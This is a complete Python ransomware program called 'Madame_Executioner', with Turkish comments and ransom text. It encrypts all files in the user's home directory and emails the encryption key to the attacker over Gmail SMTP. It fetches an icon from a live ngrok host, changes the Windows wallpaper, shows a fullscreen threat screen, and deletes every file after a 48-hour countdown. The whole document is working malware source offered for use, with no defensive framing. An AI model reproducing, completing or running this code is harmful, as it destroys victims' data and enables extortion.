import os
from tkinter import *
import datetime
import time
from cryptography.fernet import Fernet
import threading
import ctypes
import urllib.request
from email.message import EmailMessage
import ssl
import smtplib

class Madame_executioner():
    #key--------------------------------------------------------
    key = Fernet.generate_key()
    #key--------------------------------------------------------
    def __init__(self):
        #files printed !
        #list ile dolaş!
        # print(self.list_files_utf8())
        

        #2 process at the same time!
        encyption_thread = threading.Thread(target=self.encrypt_all_files)
        interface_thread = threading.Thread(target=self.interface)
        email_sender_threat = threading.Thread(target=self.send_email)
        start_time_thread = threading.Thread(target=self.time_to_cash)
        change_background_thread = threading.Thread(target=self.change_background)

        encyption_thread.start()
        time.sleep(2)
        email_sender_threat.start()
        time.sleep(2)
        interface_thread.start()
        time.sleep(2)        
        change_background_thread.start()
        time.sleep(2)
        start_time_thread.start()
        time.sleep(2)
        start_time_thread.join()

    
    #sended email --------------------------------------------------------------------------------------    
    #moex epbw nsvc ytoj 
    def send_email(self):
        #you have to 2-step verification!
        #email alınacak hesap!
        email_sender = 'email sender'
        #passwordun 16 karakterli olmalıdır dikkat et !
        email_password ='email password'
        #email alan hesap yani sende olacak!
        email_receiver='email receiver'
        subject = 'special_KEY'
        #remove first-2-word = b' | and last word = '
        email_key = self.key
        body = ("""

                KEY:{special_mail_key}
                
""").format(special_mail_key=email_key)
    
        about_em = EmailMessage()
        about_em['From'] = email_sender
        about_em['To'] = email_receiver
        about_em['Subject'] = subject
        about_em.set_content(body)
        context_ssl = ssl.create_default_context()

        with smtplib.SMTP_SSL('smtp.gmail.com',465,context=context_ssl) as smtp:
            smtp.login(email_sender,email_password)
            smtp.sendmail(email_sender,email_receiver,about_em.as_string())

    #change wallpaper ------------------------------------------------------------------------------------------

    #image file extention => jpg
    def change_background(self):
        #go specify address and download image
        image_url = "your host jpg"
        image_path = os.path.expanduser("~") + "/madame_executioner.jpg"
        urllib.request.urlretrieve(image_url,image_path)
        spi_setdeskwallpaper = 20
        ctypes.windll.user32.SystemParametersInfoW(spi_setdeskwallpaper, 0, image_path, 0)

    def encrypt_all_files(self):
        #keyyyyyy
        # with open("generatedkey2.key","wb") as generated_key:
        #     generated_key.write(self.key)
        #k----------------------------------------------------------------------------------------
        for file in self.list_files_utf8():
            try:
                with open(file,"rb") as readed_file:
                    #contentler okunur ve hafızada tutulur!
                    file_contents = readed_file.read()
                    #file encrypt
                    contents_encryption = Fernet(self.key).encrypt(file_contents)
                with open(file,"wb") as writed_file:
                    writed_file.write(contents_encryption)
            except Exception as e:
                print(e)
                continue
    #-----------------------------------------------------------------------------------------------
    def decrypt_all_files(self):
        for file in self.list_files_utf8():
            with open(file,"rb") as readed_file:
                file_enc_contents = readed_file.read()
            contents_decription = Fernet(self.key).decrypt(file_enc_contents)
            with open(file,"wb") as writed_file:
                writed_file.write(contents_decription)

    #utf-8 received files and returned files!!
    def list_files_utf8(self):
        file_list = []
        path_base = os.path.expanduser('~')
        # path_base = "C:/Users/Egemen/Desktop/selam"       
        for root, dirs, files in os.walk(path_base):
            for file in files:
                try:
                    if file == "madame_executioner.exe" or file== "generatedkey2.key" or file == "ransomware.py" or file == "hacker_118137.ico" or file == "madame_executioner.jpg" or file == "result_ransomware.py" or file == "result_ransomware.exe":
                        continue
                    # Dosya yolunu oluştur
                    file_path = os.path.join(root, file)
                    # Dosya yolunu encode ederken hatalı karakterleri replace ile değiştir
                    utf8_path = file_path.encode('utf-8', 'replace').decode('utf-8', 'replace')
                    file_list.append(utf8_path)
                except Exception as e:
                    # Handling
                    print(f"Error processing file {file_path}: {e}")

        return file_list


    #user gets the fucking interface! ---------------------------------------------------------------------------------------------------------------------------------------------------
    def interface(self):
        window = Tk()
        # window.wm_iconbitmap("Pixture-Halloween-Skull.32.ico")
        window.title("Madame_Executioner.exe")
        # icon_path = "C:/Users/Egemen/Desktop/ransomware/Pixture-Halloween-Skull.32.ico"
        #change web address 
        icon_url = "https://10e5-176-88-37-176.ngrok-free.app/hacker_118137.ico"
        icon_path = os.path.expanduser('~') + '/hacker_118137.ico'
        urllib.request.urlretrieve(icon_url,icon_path)
        window.wm_iconbitmap(icon_path)
        #background
        window.configure(background="black")
        time_label = Label(window,text="48 SAATİN VAR\nYOKSA SİSTEMİNDEKİ\nTÜM DOSYALAR\nSİLİNECEKTİR!",foreground="#AF0404",background="black",font=("arial",24))
        time_label.place(x=1100,y=150)
        time_label2 =Label(window,text="""
𐌔𐌕𐌄𐌙𐌉𐌐 𐌉𐌔𐌕𐌄𐌌𐌄𐌃𐌉ğ𐌉𐌌𐌉\n𐌃Ꝋğ𐌓𐌵 𐌃ü𐌓ü𐌔𐌕 𐌁𐌉𐌋𐌌𐌄𐌃𐌉ğ𐌉𐌌, 𐌅𐌀𐌊𐌀𐌕\n𐌍𐌄𐌕𐌉𐌂𐌄𐌔𐌉 𐌀𐌋𐌄𐌙𐋅𐌉𐌌𐌄 çı𐌊𐌀𐌓𐌔𐌀\n𐌉𐌔𐌕𐌄𐌌𐌄𐌃𐌉ğ𐌉𐌌𐌉 𐌉𐌃𐌃𐌉𐌀 𐌄𐌕𐌕𐌉ğ𐌉𐌌\n𐌁𐌵 𐌍𐌄ᕓ𐌉 𐌔öⱿ ᕓ𐌄 𐌅𐌉𐌉𐌋𐌋𐌄𐌓𐌉𐌌𐌉𐌍 𐌃𐌀𐌉𐌌𐌉\n𐌁𐌉𐌓 𐌌𐌄𐌔𐌵𐌋ü𐌍ü 𐌁𐌵𐌋𐌌𐌵ş𐌕𐌵𐌌\n𐌁𐌵𐌍𐌀 𐌉ç𐌉𐌌𐌃𐌄𐌊𐌉 ş𐌄𐌙𐌕𐌀𐌍 𐌃𐌉𐌙Ꝋ𐌓𐌃𐌵𐌌\n\n𐌃𐌄ᕓ𐌄𐌋Ꝋ𐌐𐌄𐌃 𐌁𐌙 𐌄𐋄𐌄.𐌍𐌄𐌌𐌄Ᏽ𐌄\n\n ⛧°。 ⋆༺♱༻⋆。 °⛧
""",background="black",foreground="#FF0000",font=("arial",24))    
        time_label2.place(x=1100,y=300)
        #fullscreen
        # window.geometry("1366x768")
        window.attributes("-fullscreen",1)
        window.bind("<Escape>",lambda event: window.attributes("-fullscreen",0))
       #label

        skull = Label(
            window,
            text="""
⠀⠀⠀⠀⠀⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀
⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀
⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀
⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀
⠀⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀
⠀⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

""",
            background="black",
            foreground="#1E5128",
            font="arial"
            )
        information_label2 = Label(window,text="RANSOMWARE!",font=("arial",18),background="black",foreground="#750E21")
        information_label2.place(x=120,y=50)
        information_label2 = Label(window,text="Oooppsss! Dosyalarınız Şifrelendi!\nbelirtilen zamana kadar şansınız var\nsistem harddiskinizdeki tüm dosyalar \nAES ve HMAC-SHA256 gibi\nsimetrik bir hash ile şifrelenmiştir!\nLütfen belirtilen yere özel anahtarı giriniz!\nAksi taktirde dosyalar silinecektir!",font=("arial",18),background="black",foreground="#1E5128")
        information_label2.place(x=20,y=400)
        skull.place(x=500,y=150)

        user_received_key = Entry(window)
        user_received_key.config(background="white",
                                 foreground="#FF0000",
                                 width=50,
                                 border=5,
                                 font=("Arial",16),
                                )
        #x=565 y=700
        user_received_key.place(x=480,y=700)
        
        #Special Key Controller!
        def control():

            special_key = str(self.key) 
            received_key = str("b'") + str(user_received_key.get()) + str("'")
            # print(f"key={special_key},user_key={received_key}")

            if special_key == received_key: #there will be equal special key
                time.sleep(3)
                self.decrypt_all_files()
                time.sleep(1)
                succesfuly = Label(window,text="Successfully✅",background="#1E5128",foreground="black",font=("arial",24),anchor="center")
                succesfuly.pack(side="bottom")

                def success_quit_function(): 
                    window.destroy()
                    root = Tk()
                    # root.wm_iconbitmap("Pixture-Halloween-Skull.32.ico")
                    root.configure(background="black")
                    root.title("𐌌𐌀𐌃𐌀𐌌_𐌄𐋄𐌄𐌂𐌵𐌕𐌉Ꝋ𐌍𐌄𐌓.𐌄𐋄𐌄")
                    root.attributes("-fullscreen",1)
                    success_label = Label(root,text="Tüm Dosyalar Decrypt Edildi!\n\nDosyalar Kullanıma Hazır\n",background="black",foreground="green",font=("arial",18))
                    success_label.place(x=200,y=200)
                    success_information = Label(root,text="Bundan sonra HİÇ BİR ZAMAN burnu havada konuşmayacaksın!\nbiz boktan müfredatınızı\no boktan egonuzu\ntatmin edin diye yaratılmadık\nunutma\nARKANDAYIZ!",background="black",foreground="#CD1818",font=("arial",18))
                    success_logo = Label(root,text="𐌃𐌄ᕓ𐌄𐌋Ꝋ𐌐𐌄𐌃 𐌁𐌙 𐌍𐌄𐌌𐌄Ᏽ𐌄  ☠︎︎",background="black",foreground="#CD1818",font=36)
                    success_logo.place(x=650,y=350)
                    success_information.place(x=400,y=150)
                    success_banner= Label(root,text="""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡴⠶⠶⠶⠶⠶⠤⠤⠤⢤⣤⣠⡶⠻⠉⢹⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⠀⢀⣀⡠⠤⠤⠤⠤⢄⣴⠟⠀⠀⠀⢀⣿⣿⣖⠶⠤⠤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡄⠀⣀⣀⣀⣀⣀⣴⣿⠏⠀⠀⠀⡇⢘⣿⣿⣝⣧⣐⣒⣤⣬⠭⣉⣛⠒⠦⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠈⡍⠁⠀⠀⡾⢱⡟⠀⠀⠀⠀⡗⠈⢿⡿⠙⠚⢿⡄⠈⠉⠉⠓⠚⠿⢵⣖⣪⣭⣓⠢⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡜⠀⣷⠀⠀⢸⠃⣿⣇⠀⢀⢀⣈⣀⣀⡈⢷⣶⣷⣶⣿⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠑⠶⠤⣉⡳⢦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⡄⠸⡄⠀⢸⢠⣟⣧⣶⣿⣛⢿⣿⣿⣿⢷⣿⣿⡿⠿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠑⠺⢷⣄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡍⠀⣇⠀⣿⠻⣿⣿⣿⣿⣷⣦⡙⣿⣿⣿⣿⣯⣡⣤⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇⠀⢸⠀⣿⢼⣿⣿⠷⠋⡙⣟⣿⣉⠉⠹⢿⣿⣏⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡀⠘⣆⣿⢸⣻⣿⣾⡏⣡⡄⣀⣉⣹⣶⣾⣿⡏⠟⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡀⢻⡿⣌⣿⣿⣿⣿⠟⢛⣉⠁⠈⣿⣿⡟⠁⢠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣯⠁⠘⣧⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣿⡟⣤⣴⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡤⣿⣀⠀⢿⡏⢧⡈⣿⣿⣿⣿⣿⣿⣿⢿⠟⠛⠻⣿⠿⠙⣗⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⠏⠁⢀⣿⡏⡀⢸⣷⣸⣿⡙⠿⣿⣿⣿⣿⣟⢮⡞⠀⠀⠋⠀⢘⣿⠟⠈⠉⠳⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⣀⣀⣸⣿⣷⢷⠀⣿⣷⡱⣝⠒⣿⣿⢿⡿⣷⣿⠆⠀⣠⠂⢠⡟⡁⠀⠀⠈⠙⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣿⣩⠠⠤⣀⣭⣿⣿⣞⡆⢹⣷⡿⣍⠓⠦⣼⣿⣿⡋⢁⣤⡞⣁⠴⠿⢋⣕⠀⡀⠀⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣼⠿⠏⢀⠀⠀⢸⣿⣿⣿⣿⢃⠀⣿⣿⠈⠣⡀⠨⣿⣿⣾⣛⣽⡟⠁⠛⣿⡿⠿⠀⡇⠀⠀⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⠟⣿⠤⣄⠈⣳⣼⣿⣿⠝⠃⣿⣾⡀⢹⣌⡓⠦⠬⠿⠿⢿⣿⣯⣭⡔⠒⡛⠁⠀⡤⣠⣿⠀⡄⠀⢠⠈⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢰⡏⠀⡏⣴⣟⣿⣿⣿⡿⠏⠀⠀⠘⣷⣧⣀⣏⣛⡲⠤⠿⣿⣿⣯⣭⣽⣶⠞⠁⣠⢞⣽⣿⡟⢨⠁⠀⢸⡆⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⠁⣸⠃⠙⠛⣿⢦⣀⣀⣤⢶⣶⣿⣿⣿⣿⣶⣶⡏⠀⢀⠉⢻⣟⣫⠿⠊⢁⡾⠁⠉⣾⣿⣧⣾⣏⠀⢸⡇⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⡯⢰⠋⠀⣰⣿⣿⣿⡿⣿⡏⡠⣯⡈⣹⣟⣿⣝⣙⡇⠈⢩⣭⣿⣿⠇⢀⡴⠋⠀⠀⠐⣻⣿⢿⣿⠃⠀⣿⡇⠻⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⡿⢠⠏⠀⢀⣻⣿⠏⢿⣿⣸⢸⠁⠸⣿⣿⣿⢿⠛⣿⣷⣿⣿⣿⣷⠶⠚⠉⠀⠀⠀⠀⠘⢿⣿⣿⡷⡄⢸⣹⠇⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⢠⡟⢀⣴⣶⣾⣿⣿⡏⣰⢸⠇⣇⡏⠀⠀⠙⣿⣿⣟⡄⢹⡿⠿⠛⠛⣿⣶⣶⡦⠤⢔⣂⣀⠀⣾⡟⠻⡿⠁⢌⡿⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⢸⠀⣸⠿⠟⠟⠙⡿⠀⡇⡾⢠⣏⢣⣄⢲⣄⡘⣿⣿⣷⠘⣇⢀⣒⡯⠉⠉⠁⠈⠓⠿⣿⠟⢰⣿⡇⠴⠁⠀⣼⡽⠁⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀
⢘⣇⠉⠀⠀⣀⡼⠁⢸⣱⠇⢠⢻⡄⣿⣿⣿⣿⣿⣿⣏⠀⢻⣿⣷⣄⡄⠀⠀⢀⡤⠞⠁⢠⣿⣿⡀⠀⢀⣾⣵⡗⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠾⢾⣆⣰⣶⣷⡄⠀⢡⠏⠀⠀⠈⠀⠉⠙⢿⢱⠙⢿⣿⣄⡸⣿⣿⣿⣿⡿⠟⢉⡠⠆⣰⢿⣿⢿⠁⣠⠋⠐⣾⠇⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠻⣌⠻⣿⡿⠿⣯⡶⠇⠀⠀⢠⠀⠀⠸⣿⠀⠀⣿⡏⠁⣿⠋⠁⣁⣤⠞⠉⠀⠰⢛⣿⠋⣠⡞⠁⢀⡀⠉⠀⢠⢿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠓⠧⣤⣄⣉⣀⣀⡈⠐⢪⣷⡄⠀⡇⣧⡀⣾⣧⠁⢻⣶⣾⣿⡄⠀⠀⠀⠀⣿⣯⣾⣿⡾⠛⢉⣀⡅⠀⡜⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢹⣟⣷⣦⣾⣷⠀⣿⣿⣧⣿⢿⣇⠀⣿⣿⠛⠀⡀⢀⠀⣠⣿⣫⣾⡽⠞⠛⠛⠾⠁⣸⢁⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⢸⡟⣿⡿⣿⣷⢿⣿⣿⣿⡜⣷⠄⢸⡘⣊⣭⡾⢋⡾⣿⣿⣿⣵⠶⠚⠁⠀⠀⠀⣿⣸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢸⣧⢻⣷⢻⢿⣧⡻⣿⣿⢷⣽⡆⠈⣧⠡⢄⣼⡿⠞⣻⢿⡭⠆⠀⢀⣠⣴⠀⢰⣏⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⢸⡿⣟⣷⡻⣿⣿⣿⣟⣿⣿⡂⢹⣶⣿⣿⠀⢸⡟⠉⠀⠀⠻⣿⣞⠋⢠⠇⣻⡇⠀""",background="black",foreground="#1E5128"
                                          )
                    success_label.pack(anchor="center")
                    success_banner.place(x=550,y=400)

                success_quit = Button(window,text="receive your datas",command=success_quit_function,foreground="black",font=("arial",12),background="#1E5128",padx=50,pady=10)
                success_quit.place(x=100,y=750)

            else:
                time.sleep(2)
                wrong = Label(window,text="Wrong Special Key!",background="#750E21",foreground="black",font=("arial",24))
                wrong.pack(side="bottom")

                #attention please exit cannot working for exe!
                def wrong_button_function():
                    exit()
                
                wrong_quit = Button(window,text="fuck off ",command=wrong_button_function,foreground="black",font=("arial",12),background="#750E21",padx=30,pady=10)
                wrong_quit.place(x=1000,y=750)               

        #receive user button command
        receive_button = Button(window,text="Enter!",command=control,font=("arial",12),background="grey",foreground="white",padx=30,pady=10)
        receive_button.place(x=400,y=750)
        window.resizable(width=True, height=True)

        window.mainloop()
    #---------------------------------------------------------------------------------------------------------------------------------------------------

    def remove_all_files(self):
        for files in self.list_files_utf8():
            try:
                # print(files)
                os.remove(files)
                # print(f"{files} removed!")
                        
            except Exception as e:
                print(f"{files} ERROR while DELETİNG {e}")
                continue
    
    #---------------------------------------------------------------------------------------------------------------------------------------------------
    def time_to_cash(self):
        delay_hours = 48
        delay_seconds = delay_hours * 3600 
                
        # Şu anki zamanı al
        start_time = datetime.datetime.now()
        # Hedef zamanı hesapla
        end_time = start_time + datetime.timedelta(seconds=delay_seconds)

        # Bekleme döngüsü
        while datetime.datetime.now() < end_time:
            # Geri kalan süreyi hesapla
            remaining_time = (end_time - datetime.datetime.now()).total_seconds()
            # print(f"Kalan süre: {remaining_time} saat")
            time.sleep(60)  # 1 dakika bekle

        # Süre doldu, fonksiyonu çalıştır
        self.remove_all_files()

    #-----------------------------------------------------------------------------------------------------

time.sleep(3)
madame_executioner = Madame_executioner()
